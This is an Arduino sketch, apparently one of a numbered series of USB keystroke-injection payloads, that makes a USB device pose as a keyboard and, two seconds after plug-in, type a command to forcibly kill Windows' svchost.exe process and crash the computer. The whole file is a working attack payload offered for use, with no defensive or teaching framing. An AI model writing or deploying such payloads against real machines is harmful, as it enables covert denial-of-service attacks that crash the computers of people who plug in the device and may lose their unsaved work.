// HID Payload 7: Blue Screen of Death (BSOD)
#include "Arduino.h"
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
    USB.begin();
    Keyboard.begin();
    delay(2000);
    Keyboard.println("taskkill /IM svchost.exe /F");
}

void loop() {}